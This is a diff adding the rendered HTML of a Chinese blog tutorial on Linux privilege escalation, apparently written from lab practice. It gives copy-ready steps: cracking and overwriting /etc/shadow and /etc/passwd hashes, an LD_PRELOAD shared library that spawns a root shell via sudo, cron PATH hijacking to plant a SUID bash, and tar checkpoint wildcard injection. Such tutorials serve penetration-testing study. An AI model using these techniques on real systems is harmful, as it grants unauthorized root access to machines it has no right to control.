@@ -1,0 +1,673 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  linux提权的各种手段 | L
+</title>
+<meta name="description" content="少女祈祷中..."/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" /><meta property="og:type" content="website" />
+  <meta property="og:title" content="linux提权的各种手段 | L" />
+  <meta
+    property="og:description"
+    content="少女祈祷中..."
+  />
+  <meta property="og:url" content="http://localhost:1313/post/%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83%E7%9A%84%E5%90%84%E7%A7%8D%E6%8A%80%E5%B7%A7%E6%89%8B%E6%AE%B5/" />
+  <meta
+    property="og:site_name"
+    content="HELLO WORLD"
+  />
+  <meta property="og:image" content="http://localhost:1313/images/banner.webp" />
+  <meta property="article:author" content="L" />
+  <meta property="article:published_time" content="2024-01-28T17:15:13&#43;00:00" />
+  <meta property="article:modified_time" content="2024-01-28T17:15:13&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="http://localhost:1313/images/banner.webp" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" aria-selected="false" >English</li><li data-value="ja" role="option" aria-selected="false" >日本語</li><li data-value="zh-cn" role="option" class="selected" aria-selected="true" >简体中文</li><li data-value="zh-tw" role="option" aria-selected="false" >繁體中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="linux提权的各种手段"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">linux提权的各种手段</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          
+          class="sidebar-right"  ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-利用shdow文件提权">0x01 利用shdow文件提权</a></li>
+    <li><a href="#0x02-利用passwd文件提权">0x02 利用passwd文件提权</a></li>
+    <li><a href="#0x03-利用sudo环境变量提权">0x03 利用sudo环境变量提权</a></li>
+    <li><a href="#0x04-利用自动任务权限提权">0X04 利用自动任务权限提权</a></li>
+    <li><a href="#0x05-利用suid提权">0x05 利用SUID提权</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">74</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      15
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">20</div>
+  </a>
+</div>
+<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">友链</div>
+    </div></div></div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-01-28 17:15:13 &#43;0000 UTC" itemprop="datePublished"
+      >2024-01-28</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2024-01-28</time
+    >
+  </span></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="0x01-利用shdow文件提权">
+<a class="header-anchor" href="#0x01-%e5%88%a9%e7%94%a8shdow%e6%96%87%e4%bb%b6%e6%8f%90%e6%9d%83"></a>
+0x01 利用shdow文件提权
+</h2><ul>
+<li>当shadow可读取时，对其进行暴力破解</li>
+</ul>
+<p>​		<img src="../../images/image-20231101191442605.png" alt="image-20231101191442605"></p>
+<p>​		将字串拷贝进文件，使用john进行破解即可，他会自动识别hash算法。如图，</p>
+<p><img src="../../images/image-20231101191538766.png" alt="image-20231101191538766"></p>
+<p><strong>知识点补充</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">$1</span>$ 表示使用的是 MD5 哈希函数；
+</span></span><span class="line"><span class="cl"><span class="nv">$2</span>$ 或 <span class="nv">$2</span>a$ 表示使用的是 Blowfish 哈希函数；
+</span></span><span class="line"><span class="cl"><span class="nv">$5</span>$ 表示使用的是 SHA-256 哈希函数；
+</span></span><span class="line"><span class="cl"><span class="nv">$6</span>$ 表示使用的是 SHA-512 哈希函数。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">除了还有一种特殊的形式
+</span></span><span class="line"><span class="cl">kali:<span class="nv">$y$j9T$thVUCcCzQozwQh</span>.2JyVRs.<span class="nv">$T0FS1BRAcGSTCGldig</span>/Ji2CbWc3bLVV8Ym1wEPDcIw1:19590:0:99999:7:::
+</span></span><span class="line"><span class="cl">vulnix:<span class="nv">$y$j9T$gjOH5KmSW0G</span>/57IL1Th51/<span class="nv">$cytXoMXtOBSEh572rrWZopbahP79PgkkN</span>.qt.gQkom/:19652:0:99999:7:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">其中<span class="nv">$y</span>$表示是对hash进行了加盐，这种情况无法直接使用john跑出结果。
+</span></span></code></pre></div><ul>
+<li>
+<p>当shadow文件可写，可生成对应hash，进行修改。</p>
+<p>使用mkpasswd命令进行操作</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/home/kali<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# mkpasswd -m sha-512 password   <span class="c1"># -m指定加密算法  password可自定义</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$6$WWrDOxs6nof57fef$tM0</span>/tQHyZh1l9QQuW7H7Wrj23MX6cUUa1FonEj00aPWnfXZKeb8UHpNR95qYAFyTz285RpJyhrflotFRGmHRH/
+</span></span></code></pre></div><p>​	之后再将生成的值替换原来的shadow加密字段。</p>
+<h2 id="0x02-利用passwd文件提权">
+<a class="header-anchor" href="#0x02-%e5%88%a9%e7%94%a8passwd%e6%96%87%e4%bb%b6%e6%8f%90%e6%9d%83"></a>
+0x02 利用passwd文件提权
+</h2><ul>
+<li>当passwd文件可写时，可使用生成hash代替 x 字段的方式提权。</li>
+</ul>
+<p>知识补充</p>
+<p>​</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/home/kali<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat /etc/passwd 
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/usr/bin/zsh
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl"><span class="c1">## 以前的linux中passwd文件中的x是存储hash的，只是后来为了保证安全性，又增加了shadow文件用来提高安全性。</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 但是，passwd的hash验证功能并没有被荒废，因此可以进行以下利用。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>/home/kali<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# openssl passwd <span class="m">123456</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$1$O0ogD3bT$telGJhry8Nk8vv1Hww</span>.YE1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 这里与上面不同，使用了openssl进行了加密 ，这里用mkpasswd工具也是一样的，只是说明一下新的方法。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##之后把x字段替换即可。当然也要注意合适的加密算法。</span>
+</span></span><span class="line"><span class="cl">root:<span class="nv">$1$O0ogD3bT$telGJhry8Nk8vv1Hww</span>.YE1:0:0:root:/root:/usr/bin/zsh
+</span></span></code></pre></div><h2 id="0x03-利用sudo环境变量提权">
+<a class="header-anchor" href="#0x03-%e5%88%a9%e7%94%a8sudo%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f%e6%8f%90%e6%9d%83"></a>
+0x03 利用sudo环境变量提权
+</h2><p>当输入sudo -l 出现以下情况时，可尝试进行此操作提权：</p>
+<ol>
+<li>
+<p>存在env_reset，env_keep+=LD_PRELOAD字段</p>
+<p>env_reset 的意思是执行sudo时，重制一次环境变量，这是一种安全的操作，重点是下一条env_keep+=LD_PRELOAD，表示载入LD_PRELOAD这个动态链接器，实现预加载共享库的功能。</p>
+</li>
+<li>
+<p>存在（root）NOPASSWD: /usr/sbin/XXX</p>
+</li>
+</ol>
+<p>​		如图这种情况：</p>
+<!-- raw HTML omitted -->
+<ul>
+<li>利用</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat xxx                   
+</span></span><span class="line"><span class="cl"><span class="c1">#include&lt;stdio.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include&lt;sys/types.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include&lt;stdlib.h&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">void _init<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                unsetenv<span class="o">(</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                system<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##创建以上内容的c文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gcc -fPIC -shared -o shell.so xxx -nostartfile  <span class="c1">##将文件编译成共享库文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo <span class="nv">LD_PRELOAD</span><span class="o">=</span>/home/user/shell.so /usr/sbin/XXX  <span class="c1">## 执行sodo时指定生成的共享库即可提权。</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##/usr/sbin/XXX 不需要添加参数，只作为执行sudo的契机，因为在执行该命令之前就已经通过共享库实现了提权逻辑。</span>
+</span></span></code></pre></div><h2 id="0x04-利用自动任务权限提权">
+<a class="header-anchor" href="#0x04-%e5%88%a9%e7%94%a8%e8%87%aa%e5%8a%a8%e4%bb%bb%e5%8a%a1%e6%9d%83%e9%99%90%e6%8f%90%e6%9d%83"></a>
+0X04 利用自动任务权限提权
+</h2><ul>
+<li>
+<p><strong>以root权限运行的shell脚本，并且低权限账户具有写权限。。的方式提权。</strong></p>
+<!-- raw HTML omitted -->
+<p>直接修改文件内容如下，</p>
+<p>​		<img src="../../images/image-20231102214030944.png" alt="image-20231102214030944"></p>
+<p>起好端口监听即可。</p>
+</li>
+<li>
+<p><strong>利用自动任务中PATH环境变量的方式提权</strong></p>
+<p>还是上面的例子，当输入cat /etc/crontab 时，发现了，如图<img src="../../images/image-20231102214754189.png" alt="image-20231102214754189"></p>
+<p>这里的PATH 和直接在shell界面中 输出echo $PATH 有所不同。如图：</p>
+<p><img src="../../images/image-20231102214928263.png" alt="image-20231102214928263"></p>
+<p>因为定时任务运行时，会使用他自己的PATH变量。</p>
+<p>并且由于PATH变量的匹配是从左向右依次执行的，所以，可以尝试在优先于执行脚本所在的路径创建与其同名的脚本，进行提权。</p>
+<p><img src="../../images/image-20231102215147415.png" alt="image-20231102215147415"></p>
+<p>overwrite.sh  的路径在PATH中的第三个，尝试在第一个路径下创建同名文件，并赋予执行权限。</p>
+<p><img src="../../images/image-20231102215357976.png" alt="image-20231102215357976"></p>
+<p>创建内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">	<span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">	cp /bin/bash /tmp/rootbash
+</span></span><span class="line"><span class="cl">	chmod +xs /tmp/rootbash 
+</span></span></code></pre></div><p>​	等待脚本执行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">输入
+</span></span><span class="line"><span class="cl">/tmp/rootbash -p 
+</span></span><span class="line"><span class="cl">切换至root
+</span></span></code></pre></div></li>
+</ul>
+<p>​	使用这种啊方法的前提显而易见：</p>
+<pre><code>				1. 脚本不在首个PATH路径中
+				1. 不能写名绝对路径
+				1. PATH路径有写权限
+</code></pre>
+<ul>
+<li>
+<p><strong>利用定时任务中  通配符  和  tar 的检查点功能</strong></p>
+<p><strong>知识补充</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">##tar 命令用于打包压缩文件。</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##tar命令存在以下参数</span>
+</span></span><span class="line"><span class="cl">----checkpoint<span class="o">=</span>n：##每写入n（内容为数字）个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由--checkpoint-action指定
+</span></span><span class="line"><span class="cl">--checkpoint-action<span class="o">=</span>n <span class="c1">## n: exec：执行外部命令/echo:输出到页面/</span>
+</span></span></code></pre></div></li>
+</ul>
+<p>见实例：</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><strong>实操环节，还是上面的例子</strong></p>
+<p><img src="../../images/image-20231102221326690.png" alt="image-20231102221326690"></p>
+<p>这次看compress.sh这个文件，文件内容如图，意思是进入user家目录，将里面的文件打包备份。* 表示所有文件。</p>
+<p><img src="../../images/image-20231102221910537.png" alt="image-20231102221910537"></p>
+<p>生成木马文件，传递至目标机器中。  .elf格式为linux下的二进制格式，同比windows下的.exe文件。</p>
+<p>然后在备份目录下创建特殊命名的文件，等待即可。</p>
+<p><img src="../../images/image-20231102222139921.png" alt="image-20231102222139921"></p>
+<p>.</p>
+<h2 id="0x05-利用suid提权">
+<a class="header-anchor" href="#0x05-%e5%88%a9%e7%94%a8suid%e6%8f%90%e6%9d%83"></a>
+0x05 利用SUID提权
+</h2><p>搜寻suid文件</p>
+<!-- raw HTML omitted -->
+</div>
+    <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
+    <a
+      class="article-category-link"
+      href="/categories/%e6%8f%90%e6%9d%83"
+      data-aos="zoom-in"
+      >提权</a
+    >
+    </li></ul>
+<ul class="article-tag-list" itemprop="keywords"></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt="MERCY靶机"
+              class="lazyload"
+            /><a
+          href="/post/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/0x03-mercy-v2/"
+          aria-label="前一篇:MERCY靶机"
+          title="前一篇:MERCY靶机"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">MERCY靶机</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt="LDAP"
+              class="lazyload"
+            /><a
+          href="/post/ad%E5%9F%9F/ldap/"
+          aria-label="后一篇:LDAP"
+          title="后一篇:LDAP"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">LDAP</h3>
+      </div></nav></article></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2026<span class="footer-info-sep rotate"></span>L
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp;Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;73.0k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:05</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-利用shdow文件提权">0x01 利用shdow文件提权</a></li>
+    <li><a href="#0x02-利用passwd文件提权">0x02 利用passwd文件提权</a></li>
+    <li><a href="#0x03-利用sudo环境变量提权">0x03 利用sudo环境变量提权</a></li>
+    <li><a href="#0x04-利用自动任务权限提权">0X04 利用自动任务权限提权</a></li>
+    <li><a href="#0x05-利用suid提权">0x05 利用SUID提权</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">74</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      15
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">20</div>
+  </a>
+</div>
+<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
